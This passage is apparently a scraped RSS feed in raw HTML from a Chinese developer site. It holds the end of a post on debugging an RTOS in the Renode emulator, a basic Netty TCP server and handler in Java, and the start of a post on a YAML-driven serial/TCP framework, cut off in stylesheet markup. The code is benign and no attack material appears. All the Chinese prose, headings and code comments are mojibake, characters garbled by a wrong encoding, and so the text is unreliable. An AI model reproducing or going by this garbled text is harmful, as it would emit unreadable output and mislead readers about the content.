<li>ä»¥åŠ PendSV è‡ªå·±ä¿å­˜çš„ R4â€“R11</li>
</ul>
<p>Renode çš„å¯„å­˜å™¨çª—å£èƒ½é€æ¡éªŒè¯ï¼š â€œæˆ‘ä¿å­˜/æ¢å¤çš„é¡ºåºå¯¹ä¸å¯¹ï¼Ÿâ€ â€œæˆ‘çš„ PSP æ˜¯å¦æ­£ç¡®æŒ‡å‘ä»»åŠ¡æ ˆï¼Ÿâ€</p>
<p>è¿™äº›ä»¥å‰éƒ½æ˜¯é çŒœï¼Œç°åœ¨èƒ½çœŸæ­£çœ‹åˆ°ã€‚</p>
<p>æ›´åŠ <strong>æœ‰åˆ©äºç†è§£RTOSä¸­ä¸Šä¸‹æ–‡çš„ä¿å­˜çš„å®ç°</strong>ï¼›</p>
<p>æˆ‘åœ¨å®ç°å †æ ˆåˆ‡æ¢çš„æ—¶å€™ï¼Œä½¿ç”¨çš„è£¸å‡½æ•°å…³é”®å­—ï¼Œå…¶ä¸­æœ‰åœ¨è®¾ç½®PSPçš„æ—¶å€™ï¼Œé”™è¯¯çš„è®¾ç½®æˆäº†MSPï¼Œå¯¼è‡´è¿”å›Thread Modeçš„æ—¶å€™ï¼Œç³»ç»Ÿå‡ºç°å¼‚å¸¸ï¼Œä½¿ç”¨Renodeå¯ä»¥å¾ˆæ¸…æ™°å¤ç°å’Œå¯æ§é—®é¢˜ï¼›</p>
<h2 data-id="heading-9">4.3 FreeRTOS/ä¹¦ä¸Š RTOS ä½¿ç”¨çš„é“¾è¡¨ç»“æ„</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4feb2a32015c429997934583ea8e294c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTM4NTU5NDYyNDc1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765773783&amp;x-signature=otWQ6ovHCSKtKfwzuEwXm0yNfBM%3D" alt="é“¾è¡¨.jpg" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>æˆ‘è°ƒè¯•æ—¶é‡åˆ°è¿‡ä¸¤ä¸ªå…¸å‹é—®é¢˜ï¼š</p>
<ul>
<li>pxIndex æ¨è¿›é”™è¯¯</li>
<li>pxNext æŒ‡å‘éæ³•åœ°å€å¯¼è‡´ UsageFault</li>
</ul>
<p>ä½¿ç”¨renodeåï¼Œæˆ‘èƒ½å¾ˆå¥½åœ°åœ¨ GDB é‡Œçœ‹åˆ°çš„ pxNext, pxPrevious, pxIndexã€‚</p>
<h2 data-id="heading-10">5. è°ƒè¯•æ—¶æˆ‘é‡åˆ°çš„å…³é”®é—®é¢˜ï¼ˆé™„å›¾ç¤ºç†è§£ï¼‰</h2>
<h2 data-id="heading-11">ğŸ§¨ 5.1 vListInsert å‡ºç° UsageFault</h2>
<pre><code class="hljs language-ini" lang="ini">for (<span class="hljs-attr">pxIterator</span> = &amp;pxList-&gt;xListEnd<span class="hljs-comment">;</span>
     pxIterator-&gt;pxNext-&gt;itemValue &lt;= pxNewListItem-&gt;itemValue<span class="hljs-comment">;</span>
     <span class="hljs-attr">pxIterator</span> = pxIterator-&gt;pxNext)
{
}
</code></pre>
<p>ç”±äºé“¾è¡¨åˆå§‹åŒ–ä¸å®Œæ•´ï¼š</p>
<ul>
<li>pxIterator-&gt;pxNext = 0xFFFFFFFFï¼Œå¯¼è‡´ç¨‹åºæ— æ³•æ­£å¸¸è¿è¡Œ</li>
<li>ä¸€äº›é‡æŒ‡é’ˆè¢«å¼•ç”¨æ—¶ç›´æ¥è§¦å‘ UsageFault</li>
</ul>
<p>ç”¨ Renode å•æ­¥åï¼Œæˆ‘èƒ½çœ‹åˆ° EXACTLY å“ªä¸€æ¡æ±‡ç¼–æŒ‡ä»¤è®¿é—®äº†éæ³•åœ°å€ã€‚</p>
<h2 data-id="heading-12">ğŸ§¨ 5.2 BASEPRI è®¾ç½®ä¸å½“å¯¼è‡´ configASSERT æŠ¥é”™</h2>
<p>ç—‡çŠ¶ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">configASSERT</span>( (IPSCR &amp; <span class="hljs-number">0</span>xFF) == <span class="hljs-number">0</span> )
</code></pre>
<p>è¡¨ç¤ºè¿›å…¥ä¸´ç•ŒåŒºæ—¶ï¼Œä»»åŠ¡å¤„äºå¼‚å¸¸çŠ¶æ€ã€‚</p>
<p>æœ€ç»ˆæˆ‘å‘ç°ï¼š</p>
<ul>
<li>ä¸´ç•ŒåŒºåµŒå¥—è®¡æ•°é”™è¯¯</li>
<li>BASEPRI è®¾ç½®æ¯”é¢„æœŸæ›´é«˜</li>
<li>é˜»æ–­äº†æœ¬åº”è§¦å‘çš„ SVC</li>
<li>å¯¼è‡´è°ƒåº¦å™¨è¿›å…¥é”™è¯¯çŠ¶æ€</li>
</ul>
<p>è¿™ä¸€ç±»é”™è¯¯é æ™®é€šè°ƒè¯•å™¨å¾ˆéš¾æŠ“ä½ï¼ŒRenode é€šè¿‡ä¸­æ–­äº‹ä»¶å¯ä»¥æ¸…æ™°çœ‹åˆ°ä¼˜å…ˆçº§å˜åŒ–ã€‚</p>
<h2 data-id="heading-13">ğŸ§¨ 5.3 pxIndex æŒ‡å‘é”™è¯¯å¯¼è‡´ä»»åŠ¡åˆ‡æ¢æ··ä¹±</h2>
<p>ç—‡çŠ¶ï¼š</p>
<ul>
<li>å½“å‰ä»»åŠ¡ TCB é”™ä¹±</li>
<li>listGET_OWNER_OF_HEAD_ENTRY è¿”å›é”™è¯¯åœ°å€</li>
<li>PendSV æ¢å¤æ ˆæ—¶è·³åˆ°é”™è¯¯ PC</li>
</ul>
<p>é“¾è¡¨ç»“æ„å›¾å†æ¬¡æä¾›å¸®åŠ©ï¼š</p>
<p>é€šè¿‡ Renode å•æ­¥ï¼Œæˆ‘èƒ½ä»ï¼š</p>
<pre><code class="hljs">pxIndex â†’ pxNext â†’ pvOwner
</code></pre>
<p>ä¸€è·¯çœ‹åˆ°é“¾è¡¨çš„çœŸå®ç»“æ„ï¼Œä»è€Œç¡®è®¤å“ªä¸ªèŠ‚ç‚¹è¢«ç ´åã€‚</p>
<h2 data-id="heading-14">6. Renode è°ƒ RTOS çš„å‡ ä¸ªå¼ºçƒˆæ¨èæŠ€å·§ï¼ˆé…å›¾ï¼‰</h2>
<h3 data-id="heading-15">â‘  æŸ¥çœ‹ CPU å¯„å­˜å™¨</h3>
<pre><code class="hljs">cpu DumpRegisters
 
</code></pre>
<p>å°¤å…¶æ˜¯ PSP/MSP/CONTROLï¼Œå¾ˆå…³é”®ã€‚</p>
<h3 data-id="heading-16">â‘¡ æŸ¥çœ‹å¤–è®¾ï¼ˆæ¯”å¦‚ SysTick å¯„å­˜å™¨ï¼‰</h3>
<p>ä½ ä¹‹å‰ Systick ENABLE ä½å†™é”™ï¼Œè¿™ä¸ªå›¾èƒ½å¸®åŠ©ç†è§£æ§åˆ¶ä½çš„å«ä¹‰ã€‚</p>
<h3 data-id="heading-17">â‘¢ æŸ¥çœ‹ä¸­æ–­äº‹ä»¶é¡ºåº</h3>
<p>å¯ä»¥çœ‹åˆ°ï¼š</p>
<ul>
<li>SVC</li>
<li>SysTick</li>
<li>PendSV</li>
</ul>
<p>çš„è°ƒç”¨é¡ºåºï¼ˆéå¸¸æœ‰ç”¨ï¼‰ã€‚</p>
<h2 data-id="heading-18">7. ç°ä»£åŒ–åµŒå…¥å¼å¼€å‘çš„æ„Ÿæ‚Ÿ</h2>
<p>é€šè¿‡è¿™æ¬¡ä½“éªŒï¼Œæˆ‘çœŸæ­£æ„Ÿå—åˆ°ï¼š</p>
<blockquote>
<p><strong>åµŒå…¥å¼å®Œå…¨å¯ä»¥å˜å¾—â€œç°ä»£â€è€Œä¸æ˜¯â€œæŠ˜ç£¨â€ã€‚</strong></p>
</blockquote>
<ul>
<li>ä¸éœ€è¦åå¤çƒ§å½•</li>
<li>ä¸ä¾èµ–ç¡¬ä»¶</li>
<li>ä¸é ä¸²å£</li>
<li>ä¸é  J-Link</li>
<li>æ‰€æœ‰é—®é¢˜éƒ½å¯é‡å¤å¤ç°</li>
<li>æ‰€æœ‰ç»“æ„éƒ½èƒ½åœ¨ Renode ä¸­å•æ­¥è§‚å¯Ÿ</li>
<li>ä»»æ„å¼‚å¸¸éƒ½èƒ½å®šä½</li>
<li>å·¥ç¨‹ç»“æ„æ¸…æ™°</li>
<li>è°ƒè¯•ä½“éªŒæ¯” IAR/Keil å¥½å¤ªå¤š</li>
</ul>
<p>è¿™ç§æ„Ÿè§‰çœŸçš„å¾ˆçˆ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[039_Nettyç½‘ç»œç¼–ç¨‹æœåŠ¡ç«¯å…¥é—¨ç¨‹åºå¼€å‘]]></title>    <link>https://juejin.cn/post/7581025279645483046</link>    <guid>https://juejin.cn/post/7581025279645483046</guid>    <pubDate>2025-12-08T04:32:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581025279645483046" data-draft-id="7581004702945345563" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="039_Nettyç½‘ç»œç¼–ç¨‹æœåŠ¡ç«¯å…¥é—¨ç¨‹åºå¼€å‘"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T04:32:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Frank_zhou"/> <meta itemprop="url" content="https://juejin.cn/user/634850088593675"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            039_Nettyç½‘ç»œç¼–ç¨‹æœåŠ¡ç«¯å…¥é—¨ç¨‹åºå¼€å‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/634850088593675/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Frank_zhou
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.1 åˆå­¦ä¹ç»ƒ
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.1 åˆå­¦ä¹ç»ƒ" title="VIP.1 åˆå­¦ä¹ç»ƒ" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:32:00.000Z" title="Mon Dec 08 2025 04:32:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.ruyuan.netty;

<span class="hljs-keyword">import</span> io.netty.bootstrap.ServerBootstrap;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelFuture;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInitializer;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelOption;
<span class="hljs-keyword">import</span> io.netty.channel.EventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.socket.SocketChannel;
<span class="hljs-keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;
<span class="hljs-keyword">import</span> io.netty.handler.codec.string.StringDecoder;
<span class="hljs-keyword">import</span> io.netty.handler.codec.string.StringEncoder;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NettyServer</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> port;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NettyServer</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> {
        <span class="hljs-built_in">this</span>.port = port;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// è‚¯å®šéœ€è¦çº¿ç¨‹æ± ï¼Œæœ‰çš„çº¿ç¨‹å¯ä»¥å»è´Ÿè´£è·Ÿå¤§é‡çš„å®¢æˆ·ç«¯å»ºç«‹ç½‘ç»œè¿æ¥</span>
        <span class="hljs-comment">// æœ‰çš„çº¿ç¨‹å¯ä»¥å»è´Ÿè´£ç½‘ç»œioæ•°æ®è¯»å†™</span>
        <span class="hljs-comment">// ç½‘ç»œioæ•°æ®è¯»å–å‡ºæ¥ä»¥åï¼Œå¤„ç†è¯·æ±‚æ•°æ®ï¼Œæ•°æ®å¤„ç†ä¹Ÿéœ€è¦ä¸“é—¨çš„çº¿ç¨‹å»å¤„ç†</span>
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>(); <span class="hljs-comment">// é»˜è®¤çš„çº¿ç¨‹æ± çš„å¤§å°ï¼Œcpu core * 2</span>
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workerGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>(<span class="hljs-number">20</span>);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">serverBootstrap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
            serverBootstrap.group(bossGroup, workerGroup)
                    .channel(NioServerSocketChannel.class)
                    .childHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() {
                        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel socketChannel)</span> <span class="hljs-keyword">throws</span> Exception {
                            socketChannel.pipeline()
                                    .addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringDecoder</span>())
                                    .addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringEncoder</span>())
                                    .addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NettyServerHandler</span>());
                        }
                    })
                    .option(ChannelOption.SO_BACKLOG, <span class="hljs-number">128</span>)
                    .childOption(ChannelOption.SO_KEEPALIVE, <span class="hljs-literal">true</span>);

            <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> serverBootstrap.bind(port).sync();
            channelFuture.channel().closeFuture().sync();
        } <span class="hljs-keyword">finally</span> {
            workerGroup.shutdownGracefully();
            bossGroup.shutdownGracefully();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"starting netty server......"</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8998</span>;
        <span class="hljs-keyword">if</span>(args.length &gt; <span class="hljs-number">0</span>) {
            port = Integer.parseInt(args[<span class="hljs-number">0</span>]);
        }
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">NettyServer</span>(port).start();
    }

}

</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.ruyuan.netty;

<span class="hljs-keyword">import</span> io.netty.buffer.ByteBuf;
<span class="hljs-keyword">import</span> io.netty.buffer.Unpooled;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelHandlerContext;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInboundHandlerAdapter;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NettyServerHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ChannelInboundHandlerAdapter</span> {

    <span class="hljs-comment">// ç½‘ç»œè¿æ¥tcpä¸‰æ¬¡æ¡æ‰‹åï¼Œå»ºç«‹å’Œå°è£…ä¸€ä¸ªchannelï¼Œç½‘ç»œè¿æ¥çš„é€šä¿¡ç®¡é“</span>
    <span class="hljs-comment">// æ­¤æ—¶è¿™ä¸ªchannelåº”è¯¥å°±æ˜¯å¯ä»¥å®ç°ä¸€ä¸ªæ¿€æ´»</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelActive</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"channel active......"</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead</span><span class="hljs-params">(ChannelHandlerContext ctx, Object msg)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"channel read: "</span> + (String)msg);

        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello world......"</span>;
        <span class="hljs-type">ByteBuf</span> <span class="hljs-variable">responseByteBuf</span> <span class="hljs-operator">=</span> Unpooled.buffer();
        responseByteBuf.writeBytes(response.getBytes());

        ctx.channel().writeAndFlush(responseByteBuf);
        System.out.println(<span class="hljs-string">"channel write: "</span> + response);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelReadComplete</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"channel read complete......"</span>);
        ctx.flush();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exceptionCaught</span><span class="hljs-params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="hljs-keyword">throws</span> Exception {
        cause.printStackTrace();;
        ctx.close();
    }
}

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘åšäº†ä¸€ä¸ªç”¨ YAML æ¥é©±åŠ¨ä¸²å£/TCP åè®®æ‰§è¡Œçš„æ¡†æ¶ï¼Œä¸Šä½æœºä»æ­¤ä¸éœ€è¦å†™ä»£ç äº†]]></title>    <link>https://juejin.cn/post/7581073928715649058</link>    <guid>https://juejin.cn/post/7581073928715649058</guid>    <pubDate>2025-12-08T04:52:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581073928715649058" data-draft-id="7581041679189311523" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘åšäº†ä¸€ä¸ªç”¨ YAML æ¥é©±åŠ¨ä¸²å£/TCP åè®®æ‰§è¡Œçš„æ¡†æ¶ï¼Œä¸Šä½æœºä»æ­¤ä¸éœ€è¦å†™ä»£ç äº†"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2025-12-08T04:52:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="11cookies11"/> <meta itemprop="url" content="https://juejin.cn/user/1259367703787244"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘åšäº†ä¸€ä¸ªç”¨ YAML æ¥é©±åŠ¨ä¸²å£/TCP åè®®æ‰§è¡Œçš„æ¡†æ¶ï¼Œä¸Šä½æœºä»æ­¤ä¸éœ€è¦å†™ä»£ç äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1259367703787244/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    11cookies11
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:52:45.000Z" title="Mon Dec 08 2025 04:52:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid 